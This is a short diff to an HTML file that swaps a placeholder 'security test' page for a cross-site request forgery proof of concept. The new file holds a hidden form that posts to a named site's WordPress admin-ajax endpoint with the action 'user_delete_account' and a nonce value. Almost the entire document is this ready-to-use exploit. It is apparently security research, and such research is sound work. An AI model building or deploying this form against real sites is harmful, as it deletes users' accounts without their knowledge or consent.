@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Security Test</title>
-</head>
-<body>
-    <h1>UNBOUNCE-TEST-3E28DD86</h1>
-    <p>Security research proof of control.</p>
-</body>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://www.zabka.pl/wp//wp-admin/admin-ajax.php">
+			<input type="hidden" name="action" value="user_delete_account">
+			<input type="hidden" name="user_delete_account_nonce" value="d0261d6262">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
 </html>
